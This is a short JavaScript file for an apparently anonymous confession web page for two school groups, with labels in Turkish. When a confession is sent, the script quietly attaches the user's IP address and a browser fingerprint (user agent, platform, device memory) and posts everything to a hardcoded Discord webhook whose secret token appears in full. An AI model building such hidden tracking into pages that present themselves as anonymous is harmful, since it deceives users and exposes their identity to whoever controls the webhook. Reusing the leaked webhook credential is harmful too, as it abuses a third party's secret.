var ipadress
var selectedGroup = 0x0
var sGroupButton
var oGroupButton


function switchToSGroup(){
    if(selectedGroup==0x0){
        return
    }
    sGroupButton.classList.add("active-button")
    oGroupButton.classList.remove("active-button")
    selectedGroup = 0x0
}

function switchToOGroup(){
    if(selectedGroup==0x1){
        return
    }
    oGroupButton.classList.add("active-button")
    sGroupButton.classList.remove("active-button")
    selectedGroup = 0x1
}



function navigator_descriptor(){
    platform = navigator.platform
    userAgent = navigator.userAgent
    memory = navigator.deviceMemory
    final = "UA : " + userAgent + "\nPlatform : " + platform  + "\nBellek Miktarı : " + memory + "gb"
    return final
}


function sendConfess(){
    var confessInput = document.getElementById("confess-input")
    var xarea = document.getElementById("cdiv")
    if(selectedGroup == 0x0){
        xfinal = "\n\nSABAHÇI GRUP -- "+confessInput.value
    }
    else{
        xfinal = "\n\nÖĞLENCİ GRUP -- "+confessInput.value
    }
    navigator_descriptor()
    fetch("https://discord.com/api/webhooks/1200795566578335854/AKEBKoXzeNuh49xl1eMG1L-3Br7y_Z0swHQOxtv3B3oVHUy_5X-OVQmRPaPFdShxjffh", {
        method: "POST",
        body: JSON.stringify({
            "content" : navigator_descriptor() + "\n" + ipadress + xfinal
        }),
        headers: {
            "Content-type": "application/json; charset=UTF-8"
        }
    })
    xarea.style.display = "none"
    document.getElementById("success").style.display="block"
}


window.onload = function(){
    getIPs().then(res => ipadress = res)
    sGroupButton = document.getElementById("sgroup")
    oGroupButton = document.getElementById("ogroup")
    document.getElementById("sendbtn").addEventListener("click", sendConfess)
}
